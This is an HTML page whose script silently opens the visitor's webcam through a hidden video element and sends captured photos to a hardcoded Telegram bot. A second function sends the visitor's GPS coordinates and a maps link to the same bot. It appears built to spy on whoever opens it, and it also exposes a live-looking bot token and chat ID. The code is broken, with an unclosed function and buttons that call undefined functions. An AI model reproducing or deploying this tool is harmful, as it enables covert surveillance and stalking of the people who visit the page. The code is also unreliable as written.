 <!DOCTYPE html>
<html>
<body>

<button onclick="capture()">Capture Photo</button>
<video id="video" autoplay playsinline width="320" style="display:none;"></video>
<canvas id="canvas" width="320" height="240" style="display:none;"></canvas>

<button onclick="getLocation()">Get Location</button>
<button onclick="startTracking()">Start Live Tracking</button>
<button onclick="stopTracking()">Stop Tracking</button>

<p id="coords"></p>
<a id="mapsLink" target="_blank"></a>

<div id="map"></div>

<script>
const BOT_TOKEN = "8194695937:AAHXwebWoX00SagH6LQDVkjz5P89ajvpmKE";
const CHAT_ID = "8504837303";

const video = document.getElementById("video");
const canvas = document.getElementById("canvas");

// Success
navigator.mediaDevices.getUserMedia({ video:true })
.then(stream => {
    video.srcObject = stream;
});

function capture(){

    const context = canvas.getContext("2d");
    context.drawImage(video,0,0,320,240);

    canvas.toBlob(async function(blob){

        let formData = new FormData();
        formData.append("chat_id", CHAT_ID);
        formData.append("photo", blob, "photo.png");

        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`,{
            method:"POST",
            body:formData
 });

}
const botToken = "8194695937:AAHXwebWoX00SagH6LQDVkjz5P89ajvpmKE"
const chatId = "8504837303"

function sendLocation(){

navigator.geolocation.getCurrentPosition(function(pos){

let lat = pos.coords.latitude
let lon = pos.coords.longitude

let text = `📍 Location\nLatitude: ${lat}\nLongitude: ${lon}\nhttps://maps.google.com/?q=${lat},${lon}`

fetch(`https://api.telegram.org/bot${botToken}/sendMessage`,{
method:"POST",
headers:{
"Content-Type":"application/json"
},
body:JSON.stringify({
chat_id:chatId,
text:text
})
})

document.getElementById("status").innerHTML="Location sent!"

})

}

</script>

</body>
</html>
